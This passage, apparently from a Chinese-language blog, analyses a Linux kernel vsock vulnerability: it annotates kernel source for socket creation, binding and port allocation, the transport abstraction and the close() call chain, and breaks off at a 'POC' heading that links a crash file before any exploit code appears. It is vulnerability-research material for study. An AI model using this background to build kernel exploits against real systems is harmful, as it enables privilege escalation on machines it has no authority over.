class="line"><span class="comment"> * the bucket that their local address hashes to (vsock_bound_sockets(addr)</span></span><br><span class="line"><span class="comment"> * represents the list that addr hashes to).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Specifically, we initialize the vsock_bind_table array to a size of</span></span><br><span class="line"><span class="comment"> * VSOCK_HASH_SIZE + 1 so that vsock_bind_table[0] through</span></span><br><span class="line"><span class="comment"> * vsock_bind_table[VSOCK_HASH_SIZE - 1] are for bound sockets and</span></span><br><span class="line"><span class="comment"> * vsock_bind_table[VSOCK_HASH_SIZE] is for unbound sockets.  The hash function</span></span><br><span class="line"><span class="comment"> * mods with VSOCK_HASH_SIZE to ensure this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PORT_RETRIES        24</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VSOCK_HASH(addr)        ((addr)-&gt;svm_port % VSOCK_HASH_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vsock_bound_sockets(addr) (&amp;vsock_bind_table[VSOCK_HASH(addr)])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vsock_unbound_sockets     (&amp;vsock_bind_table[VSOCK_HASH_SIZE])</span></span><br></pre></td></tr></table></figure></div>





<h2 id="Func"><a href="#Func" class="headerlink" title="Func"></a>Func</h2><p>这一部分主要包括一些漏洞相关的函数源码，供读者参考，大致浏览即可（后面遇到理解问题时可以在尝试仔细阅读）</p>
<h3 id="vsock-create"><a href="#vsock-create" class="headerlink" title="vsock_create"></a>vsock_create</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vsock_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock,</span></span><br><span class="line"><span class="params">			<span class="type">int</span> protocol, <span class="type">int</span> kern)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vsock_sock</span> *<span class="title">vsk</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sock)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (protocol &amp;&amp; protocol != PF_VSOCK)</span><br><span class="line">		<span class="keyword">return</span> -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (sock-&gt;type) {</span><br><span class="line">	<span class="keyword">case</span> SOCK_DGRAM:</span><br><span class="line">		sock-&gt;ops = &amp;vsock_dgram_ops;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SOCK_STREAM:</span><br><span class="line">		sock-&gt;ops = &amp;vsock_stream_ops;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SOCK_SEQPACKET:</span><br><span class="line">		sock-&gt;ops = &amp;vsock_seqpacket_ops;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -ESOCKTNOSUPPORT;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line">	sk = __vsock_create(net, sock, <span class="literal">NULL</span>, GFP_KERNEL, <span class="number">0</span>, kern);	<span class="comment">//核心调用</span></span><br><span class="line">	<span class="keyword">if</span> (!sk)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	vsk = vsock_sk(sk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sock-&gt;type == SOCK_DGRAM) {</span><br><span class="line">		ret = vsock_assign_transport(vsk, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) {</span><br><span class="line">			sock_put(sk);</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	vsock_insert_unbound(vsk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="vsock-create-1"><a href="#vsock-create-1" class="headerlink" title="__vsock_create"></a>__vsock_create</h4><p>完成当前 sk 的初始化</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *__<span class="title">vsock_create</span>(<span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>,</span></span><br><span class="line"><span class="class">				   <span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>,</span></span><br><span class="line"><span class="class">				   <span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">parent</span>,</span></span><br><span class="line"><span class="class">				   <span class="title">gfp_t</span> <span class="title">priority</span>,</span></span><br><span class="line"><span class="class">				   <span class="title">unsigned</span> <span class="title">short</span> <span class="title">type</span>,</span></span><br><span class="line"><span class="class">				   <span class="title">int</span> <span class="title">kern</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vsock_sock</span> *<span class="title">psk</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vsock_sock</span> *<span class="title">vsk</span>;</span></span><br><span class="line"></span><br><span class="line">	sk = sk_alloc(net, AF_VSOCK, priority, &amp;vsock_proto, kern);</span><br><span class="line">	<span class="keyword">if</span> (!sk)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	sock_init_data(sock, sk);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* sk-&gt;sk_type is normally set in sock_init_data, but only if sock is</span></span><br><span class="line"><span class="comment">	 * non-NULL. We make sure that our sockets always have a type by</span></span><br><span class="line"><span class="comment">	 * setting it here if needed.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!sock)</span><br><span class="line">		sk-&gt;sk_type = type;</span><br><span class="line"></span><br><span class="line">	vsk = vsock_sk(sk);</span><br><span class="line">	vsock_addr_init(&amp;vsk-&gt;local_addr, VMADDR_CID_ANY, VMADDR_PORT_ANY);</span><br><span class="line">	vsock_addr_init(&amp;vsk-&gt;remote_addr, VMADDR_CID_ANY, VMADDR_PORT_ANY);</span><br><span class="line"></span><br><span class="line">	sk-&gt;sk_destruct = vsock_sk_destruct;</span><br><span class="line">	sk-&gt;sk_backlog_rcv = vsock_queue_rcv_skb;</span><br><span class="line">	sock_reset_flag(sk, SOCK_DONE);</span><br><span class="line"></span><br><span class="line">	INIT_LIST_HEAD(&amp;vsk-&gt;bound_table);</span><br><span class="line">	INIT_LIST_HEAD(&amp;vsk-&gt;connected_table);</span><br><span class="line">	vsk-&gt;listener = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;vsk-&gt;pending_links);</span><br><span class="line">	INIT_LIST_HEAD(&amp;vsk-&gt;accept_queue);</span><br><span class="line">	vsk-&gt;rejected = <span class="literal">false</span>;</span><br><span class="line">	vsk-&gt;sent_request = <span class="literal">false</span>;</span><br><span class="line">	vsk-&gt;ignore_connecting_rst = <span class="literal">false</span>;</span><br><span class="line">	vsk-&gt;peer_shutdown = <span class="number">0</span>;</span><br><span class="line">	INIT_DELAYED_WORK(&amp;vsk-&gt;connect_work, vsock_connect_timeout);</span><br><span class="line">	INIT_DELAYED_WORK(&amp;vsk-&gt;pending_work, vsock_pending_work);</span><br><span class="line"></span><br><span class="line">	psk = parent ? vsock_sk(parent) : <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (parent) {</span><br><span class="line">		vsk-&gt;trusted = psk-&gt;trusted;</span><br><span class="line">		vsk-&gt;owner = get_cred(psk-&gt;owner);</span><br><span class="line">		vsk-&gt;connect_timeout = psk-&gt;connect_timeout;</span><br><span class="line">		vsk-&gt;buffer_size = psk-&gt;buffer_size;</span><br><span class="line">		vsk-&gt;buffer_min_size = psk-&gt;buffer_min_size;</span><br><span class="line">		vsk-&gt;buffer_max_size = psk-&gt;buffer_max_size;</span><br><span class="line">		security_sk_clone(parent, sk);</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		vsk-&gt;trusted = ns_capable_noaudit(&amp;init_user_ns, CAP_NET_ADMIN);</span><br><span class="line">		vsk-&gt;owner = get_current_cred();</span><br><span class="line">		vsk-&gt;connect_timeout = VSOCK_DEFAULT_CONNECT_TIMEOUT;</span><br><span class="line">		vsk-&gt;buffer_size = VSOCK_DEFAULT_BUFFER_SIZE;</span><br><span class="line">		vsk-&gt;buffer_min_size = VSOCK_DEFAULT_BUFFER_MIN_SIZE;</span><br><span class="line">		vsk-&gt;buffer_max_size = VSOCK_DEFAULT_BUFFER_MAX_SIZE;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sk;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h3 id="vsock-bind"><a href="#vsock-bind" class="headerlink" title="vsock_bind"></a>vsock_bind</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __vsock_bind(<span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sockaddr_vm *addr)</span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vsock_sock</span> *<span class="title">vsk</span> =</span> vsock_sk(sk);</span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* First ensure this socket isn't already bound. */</span></span><br><span class="line">	<span class="keyword">if</span> (vsock_addr_bound(&amp;vsk-&gt;local_addr))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now bind to the provided address or select appropriate values if</span></span><br><span class="line"><span class="comment">	 * none are provided (VMADDR_CID_ANY and VMADDR_PORT_ANY).  Note that</span></span><br><span class="line"><span class="comment">	 * like AF_INET prevents binding to a non-local IP address (in most</span></span><br><span class="line"><span class="comment">	 * cases), we only allow binding to a local CID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (addr-&gt;svm_cid != VMADDR_CID_ANY &amp;&amp; !vsock_find_cid(addr-&gt;svm_cid))</span><br><span class="line">		<span class="keyword">return</span> -EADDRNOTAVAIL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (sk-&gt;sk_socket-&gt;type) {</span><br><span class="line">    <span class="comment">// 流式套接字</span></span><br><span class="line">	<span class="keyword">case</span> SOCK_STREAM:</span><br><span class="line">    <span class="comment">// 有序分组套接字</span></span><br><span class="line">	<span class="keyword">case</span> SOCK_SEQPACKET:</span><br><span class="line">		spin_lock_bh(&amp;vsock_table_lock);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用 __vsock_bind_connectible 处理可连接套接字的绑定</span></span><br><span class="line">		retval = __vsock_bind_connectible(vsk, addr); </span><br><span class="line">		spin_unlock_bh(&amp;vsock_table_lock);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">     <span class="comment">// 数据报套接字</span></span><br><span class="line">	<span class="keyword">case</span> SOCK_DGRAM:</span><br><span class="line">		retval = __vsock_bind_dgram(vsk, addr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		retval = -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个函数是 VSOCK (虚拟套接字) 的绑定操作实现，负责将一个 VSOCK 套接字绑定到指定的地址</p>
<h4 id="vsock-bind-connectible"><a href="#vsock-bind-connectible" class="headerlink" title="__vsock_bind_connectible"></a>__vsock_bind_connectible</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __vsock_bind_connectible(<span class="keyword">struct</span> vsock_sock *vsk,</span><br><span class="line">				    <span class="keyword">struct</span> sockaddr_vm *addr)</span><br><span class="line">{</span><br><span class="line">	<span class="type">static</span> u32 port;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">new_addr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!port)</span><br><span class="line">		port = get_random_u32_above(LAST_RESERVED_PORT); <span class="comment">//分配一个大于 LAST_RESERVED_PORT 的端口号</span></span><br><span class="line">	<span class="comment">// new_addr = addr</span></span><br><span class="line">	vsock_addr_init(&amp;new_addr, addr-&gt;svm_cid, addr-&gt;svm_port);</span><br><span class="line">	<span class="comment">// 如果指定的端口为 `VMADDR_PORT_ANY` 则采取自动分配</span></span><br><span class="line">	<span class="keyword">if</span> (addr-&gt;svm_port == VMADDR_PORT_ANY) {</span><br><span class="line">		<span class="type">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_PORT_RETRIES; i++) {</span><br><span class="line">			<span class="keyword">if</span> (port &lt;= LAST_RESERVED_PORT)</span><br><span class="line">				port = LAST_RESERVED_PORT + <span class="number">1</span>;</span><br><span class="line">			<span class="comment">// 每次尝试递增端口号，并检查是否已被占用</span></span><br><span class="line">			new_addr.svm_port = port++;</span><br><span class="line">			<span class="comment">// 在 bound list 中查找与指定地址匹配的套接字</span></span><br><span class="line">			<span class="keyword">if</span> (!__vsock_find_bound_socket(&amp;new_addr)) { </span><br><span class="line">				found = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="comment">// 如果找不到可用端口，返回地址不可用错误</span></span><br><span class="line">		<span class="keyword">if</span> (!found)</span><br><span class="line">			<span class="keyword">return</span> -EADDRNOTAVAIL;</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="comment">/* If port is in reserved range, ensure caller</span></span><br><span class="line"><span class="comment">		 * has necessary privileges.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="comment">// 绑定特权端口（≤ LAST_RESERVED_PORT）需要 CAP_NET_BIND_SERVICE 能力</span></span><br><span class="line">		<span class="keyword">if</span> (addr-&gt;svm_port &lt;= LAST_RESERVED_PORT &amp;&amp;</span><br><span class="line">		    !capable(CAP_NET_BIND_SERVICE)) {</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (__vsock_find_bound_socket(&amp;new_addr))</span><br><span class="line">			<span class="keyword">return</span> -EADDRINUSE;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	vsock_addr_init(&amp;vsk-&gt;local_addr, new_addr.svm_cid, new_addr.svm_port);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Remove connection oriented sockets from the unbound list and add them</span></span><br><span class="line"><span class="comment">	 * to the hash table for easy lookup by its address.  The unbound list</span></span><br><span class="line"><span class="comment">	 * is simply an extra entry at the end of the hash table, a trick used</span></span><br><span class="line"><span class="comment">	 * by AF_UNIX.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="comment">// 从未绑定列表中移除</span></span><br><span class="line">	__vsock_remove_bound(vsk);</span><br><span class="line">	<span class="comment">// 插入到绑定哈希表的相应位置</span></span><br><span class="line">	<span class="comment">// list_add(&amp;vsk-&gt;bound_table, list);</span></span><br><span class="line">	__vsock_insert_bound(vsock_bound_sockets(&amp;vsk-&gt;local_addr), vsk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>





<h3 id="vsk-transport"><a href="#vsk-transport" class="headerlink" title="vsk->transport"></a>vsk-&gt;transport</h3><p>VSOCK 是一个统一的地址族（AF_VSOCK），用于虚拟机（Guest）与宿主机（Host）之间通信，但不同虚拟化平台提供的数据通道是不同的：</p>
<table>
<thead>
<tr>
<th>平台</th>
<th>底层机制</th>
<th>内核 transport 实现</th>
</tr>
</thead>
<tbody><tr>
<td>VMware</td>
<td>VMCI（虚拟机通信接口）</td>
<td><code>vmci_transport</code></td>
</tr>
<tr>
<td>KVM / QEMU</td>
<td>Virtio</td>
<td><code>virtio_transport</code></td>
</tr>
<tr>
<td>Hyper-V</td>
<td>VMBus</td>
<td><code>hv_transport</code></td>
</tr>
</tbody></table>
<p>为了支持这些不同平台而不让上层逻辑乱套，VSOCK 设计了一个 <code>vsock_transport</code> 接口结构体来“封装差异”。</p>
<p><code>vsk-&gt;transport</code> 是 <code>vsock_sock</code> 结构体中的一个指针，指向 VSOCK 协议中用于<strong>实际执行数据传输逻辑的后端实现接口集</strong>，是 VSOCK 子系统中的一个关键抽象</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vsock_transport</span> {</span></span><br><span class="line">    <span class="type">int</span> (*bind)(<span class="keyword">struct</span> vsock_sock *vsk, <span class="keyword">struct</span> sockaddr_vm *addr);</span><br><span class="line">    <span class="type">int</span> (*connect)(<span class="keyword">struct</span> vsock_sock *vsk);</span><br><span class="line">    <span class="type">int</span> (*release)(<span class="keyword">struct</span> vsock_sock *vsk);</span><br><span class="line">    <span class="type">ssize_t</span> (*send_pkt)(<span class="keyword">struct</span> vsock_sock *vsk, <span class="keyword">struct</span> sk_buff *skb);</span><br><span class="line">    <span class="type">ssize_t</span> (*recv_stream)(<span class="keyword">struct</span> vsock_sock *vsk, <span class="keyword">struct</span> msghdr *msg, <span class="type">size_t</span> len, <span class="type">int</span> flags);</span><br><span class="line">    ...</span><br><span class="line">};</span><br></pre></td></tr></table></figure></div>





<h3 id="sock-vsock"><a href="#sock-vsock" class="headerlink" title="sock & vsock"></a>sock &amp; vsock</h3><p><strong>(1) <code>struct sock</code> (通用套接字层)</strong></p>
<ul>
<li><strong>定义位置</strong>：<code>include/net/sock.h</code></li>
<li><strong>作用</strong>：表示一个通用的网络套接字，是所有协议族（如 INET、UNIX、VSOCK 等）套接字的<strong>基类</strong>。</li>
<li><strong>包含字段</strong>：<ul>
<li>协议无关的通用状态（如引用计数 <code>sk_refcnt</code>）</li>
<li>套接字队列（接收/发送缓冲区）</li>
<li>操作函数表（<code>struct proto_ops *sk_prot_ops</code>）</li>
<li>网络命名空间指针等</li>
</ul>
</li>
</ul>
<p><strong>(2) <code>struct vsock_sock</code> (VSOCK专用层)</strong></p>
<ul>
<li><p><strong>定义位置</strong>：<code>net/vmw_vsock/af_vsock.h</code></p>
</li>
<li><p><strong>作用</strong>：VSOCK 协议族的<strong>扩展数据结构</strong>，继承自 <code>sock</code> 并添加 VSOCK 特有的属性和方法。</p>
</li>
<li><p><strong>关键字段</strong>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vsock_sock</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> <span class="title">sk</span>;</span>            <span class="comment">// 内嵌的通用sock结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">local_addr</span>;</span>  <span class="comment">// 本地CID+端口</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">remote_addr</span>;</span> <span class="comment">// 远程CID+端口</span></span><br><span class="line">    <span class="comment">// VSOCK特有状态（如传输层接口、流控制等）</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vsock_transport</span> *<span class="title">transport</span>;</span></span><br><span class="line">    u32 buf_size;</span><br><span class="line">    u32 buf_alloc;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="vsock-close-s-call-chain"><a href="#vsock-close-s-call-chain" class="headerlink" title="vsock close(s) call chain"></a>vsock <strong><code>close(s)</code> call chain</strong></h3><p>在对 <code>vsock</code> 套接字调用 <code>close(s)</code> 时，相关触发逻辑如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__vsock_release(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level)</span><br><span class="line">    ↳ vsock_release(<span class="keyword">struct</span> socket *sock)</span><br><span class="line">        ↳ __sock_release()</span><br><span class="line">            ↳ sock_close()</span><br><span class="line">                ↳ __fput()</span><br><span class="line">                    ↳ fput()</span><br><span class="line">                        ↳ filp_close()</span><br><span class="line">                            ↳ sys_close(fd)</span><br></pre></td></tr></table></figure></div>





<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><blockquote>
<p>Link: <a class="link" target="_blank" rel="noopener" href="https://hoefler.dev/articles/attachments/crash.c">https://hoefler.dev/articles/attachments/crash.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 